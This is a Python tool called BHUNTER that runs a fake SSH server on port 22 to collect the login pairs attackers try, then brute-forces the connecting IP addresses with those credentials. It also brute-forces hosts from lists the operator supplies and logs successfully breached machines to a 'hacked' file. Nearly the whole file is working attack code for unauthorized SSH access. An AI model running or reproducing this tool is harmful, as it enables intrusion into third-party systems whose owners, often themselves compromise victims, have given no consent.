#!/usr/bin/env python3

from threading import Thread
import os, paramiko
import sys
import time
# import libtmux
import datetime, time
import socket, sys, threading
import queue
import inspect

debugMode = 1

logs = "/var/log/bhunter/"

honeypotLog = logs + "honeypot.log"
attackLog = logs + "attack.log"
hacked = logs + "hacked.log"
debugLog = logs + "debug.log"
configs = "/etc/bhunter/"
serverKey = configs + "server.key"
defLogins = configs + "defLoginPairs.txt"

#statistic
attackedTargets = 0
targetsInQ = 0
hackedTargets = []

listOfLogins = [] # login = (rate, ("login", "password"))
burstShotsQue = queue.Queue() #.put() .get()
singleShotsQue =  queue.Queue()
setOfCaptureTargets = {} # (target, captureTime)


def addToFile(file, str):
    f = open(file, "a")
    f.write(str)
    f.close()

def logger(file, str):
    timestamp = datetime.datetime.now().strftime("%d-%m-%Y %H:%M")
    addToFile(file, "{} : {}\n".format(timestamp, str))

def debug(str):
    if(debugMode):
        logger(debugLog, str)


#------------- HoneyPot Section -------------
def addTarget(target):
    global targetsInQ
    targetsInQ += 1
    burstShotsQue.put(target)
    setOfCaptureTargets[target] = (int(time.time()))
    logger(honeypotLog, "new target   {}".format(target))

def addLoginPair(login, password, rate):
    listOfLogins.append([rate, (login, password)])
    logger(honeypotLog, "new loginPair ({}, {})".format(login, password))

def SSHLoginsCollector(source, client_socket):
    HOST_KEY = paramiko.RSAKey(filename=serverKey)
    class SSHServerHandler (paramiko.ServerInterface):
        def __init__(self):
            self.event = threading.Event()
        def check_auth_password(self, username, password):
            logger(honeypotLog, "new login attempt ({}, {}, {})".format(source[0], username, password))
            flag = 1
            for i in listOfLogins:
                if(i[1][0] == username and i[1][1] == password):
                    i[0] = i[0] + 1
                    flag = 0
                    break
            if(flag):
                addLoginPair(username, password, 0)
                singleShotsQue.put((source[0], username, password))
            return paramiko.AUTH_FAILED
        def get_allowed_auths(self, username):
            return 'password'

    transport = paramiko.Transport(client_socket)
    transport.add_server_key(HOST_KEY)
    server_handler = SSHServerHandler()
    transport.start_server(server=server_handler)
    channel = transport.accept(1)
    if not channel is None:
        channel.close()

def SSHhoneypot():
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('', 22))
            server_socket.listen(100)
            # paramiko.util.log_to_file ('paramiko.log')
            while(True):
                try:
                    client_socket, client_addr = server_socket.accept()
                    threading.Thread(target=SSHLoginsCollector, args=(client_addr, client_socket,)).start()
                    logger(honeypotLog, "new connection   {}".format(client_addr[0]))
                    if(not client_addr[0] in setOfCaptureTargets.keys()):
                        addTarget(client_addr[0])
                    # thread.start_new_thread(handleConnection,(client_socket,))
                except Exception as e:
                    print("ERROR: Client handling")
                    print(e)
        except Exception as e:
            print("ERROR: Failed to create socket")
            print(e)
            sys.exit(1)


#------------- SSHAttack Section -------------

#   SSHCheck() проверяет, подходит ли логин:пароль к данному хосту
#   Возвращаемые значения:
#       0 - успешная аутентификация
#       1 - неуспешная аутентификация
#       2 - ошибка соккета при подключении
#       3 - какая либо другая ошибка при подключении по SSH
def SSHCheck(target, SSHport, user, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    resultCode = 3
    try:
        ssh.connect(target, port = SSHport, username = user, password = password, timeout=5, banner_timeout = 5, auth_timeout=5)
    except paramiko.AuthenticationException:
        resultCode = 1
    except socket.error:
        resultCode = 2
    except paramiko.ssh_exception.SSHException:
        resultCode = 3
    else:
        channel = ssh.get_transport().open_session()
        channel.get_pty()
        channel.settimeout(5)
        channel.exec_command('whoami')
        ans = channel.recv(1024).decode()
        if(ans.find(user) >= 0):
            resultCode = 0
        else:
            debug("controversial case of connest: {} {} {}".format(target, user, password))
        channel.close()
    finally:
        ssh.close()
    return resultCode

def SingleShotAttack():
    while True:
        target = singleShotsQue.get()
        # print("ss = ")
        # print(target)
        logger(attackLog, "singleshot   {} {} {}".format(target[0], target[1], target[2]))
        status = SSHCheck(target[0], 22, target[1], target[2])
        if(status == 0):
            logger(attackLog, "PASSWORD FOUND   {} {} {}".format(target[0], target[1], target[2]))
            logger(hacked, "{} {} {}".format(target))
            hackedTargets.append("{} {} {}".format(target[0], target[1], target[2]))

def BurstAttack():
    while True:
        # if(burstShotsQue.empty)
        target = burstShotsQue.get()
        logger(attackLog, "starting attack   {}".format(target))
        global attackedTargets
        attackedTargets += 1
        global targetsInQ
        targetsInQ -= 1
        for i in listOfLogins:
            logger(attackLog, "try   {} {} {}".format(target, i[1][0], i[1][1]))
            status = SSHCheck(target, 22, i[1][0], i[1][1])
            if(status == 0):
                logger(attackLog, "PASSWORD FOUND   {} {} {}".format(target, i[1][0], i[1][1]))
                logger(hacked, "{} {} {}".format(target, i[1][0], i[1][1]))
                hackedTargets.append("{} {} {}".format(target, i[1][0], i[1][1]))
                i[0] = i[0] + 10
            if(status >= 2):
                logger(attackLog, "connection error   {}".format(target))
                break
        logger(attackLog, "complete attack  {}".format(target))
        listOfLogins.sort()
        listOfLogins.reverse()

#------------- UI Section -------------
def bunner():
    os.system("clear")
    print("====================")
    print("    BHUNTER test  ")
    print("====================")

def importLP(file):
    f = open(file, "r")
    for i in f:
        loginPair = i[:-1].split(" :: ") # [:-1] - чтобы убрать перевод строки
        addLoginPair(loginPair[0], loginPair[1] if len(loginPair) > 1 else "",loginPair[2] if len(loginPair) > 2 else 0)
    f.close()

def exportLP(file):
    f = open(file, "w")
    for i in listOfLogins:
        print(i)
        f.write("{} :: {} :: {}\n".format(i[1][0], i[1][1], i[0]))
    f.close()

def importTargets(file):
    f = open(file, "r")
    for i in f:
        addTarget(i[:-1])
    f.close()

def ImportExportMenu():
    bunner()
    print(" 1) Import loginpairs\n 2) Export loginpairs\n 3) Import targets\n 4) Return\n")
    str = input(" ")
    if(str == "1"):
        file = input(" path to file: ")
        importLP(file)
    if(str == "2"):
        file = input(" path to file: ")
        exportLP(file)
    if(str == "3"):
        file = input(" path to file: ")
        importTargets(file)

def infoMenu():
    bunner()
    print(" loginpairs: {}".format(len(listOfLogins)))
    global attackedTargets
    print(" attacked targets: {}".format(attackedTargets))
    global targetsInQ
    print(" targets in queue: {}".format(targetsInQ))
    print("\n Top 10 loginpairs:")
    for i in listOfLogins[:10]:
        print(" {} :: {} :: {}".format(i[1][0], i[1][1], i[0]))
    print("\n Last 10 hacked targets:")
    for i in hackedTargets[-10:]:
        print(i)
    str = input(" ")
    # print("queue: {}".format(burstShotsQue.size()))

def mainMenu():
    os.chdir(logs)
    while True:
        bunner()
        print(" 1) Add loginpair\n 2) Add target\n 3) Import/Export\n 4) Info\n")
        str = input(" ")
        if(str == "1"):
            newLogin = input(" login: ")
            newPassword = input(" password: ")
            addLoginPair(newLogin, newPassword, 1)
        if(str == "2"):
            newTarget = input(" target: ")
            addTarget(newTarget)
        if(str == "3"):
            ImportExportMenu()
        if(str == "4"):
            infoMenu()

#------------- Main Section -------------

def loginPairsCleaner():
    global listOfLogins
    if(len(listOfLogins) > 1000):
        listOfLogins = listOfLogins[:300]
        for i in listOfLogins:
            if i[0] > 1:
                i[0] = i[0]/2

def main():
    logger(honeypotLog, "STARTING...")
    logger(attackLog, "STARTINDG...")
    importLP(defLogins)
    Thread(target=SSHhoneypot, args=()).start()
    Thread(target=mainMenu, args=()).start()
    Thread(target=BurstAttack, args=()).start()
    Thread(target=SingleShotAttack, args=()).start()
    while True:
        time.sleep(1800) # 30 minutes
        loginPairsCleaner()
main()
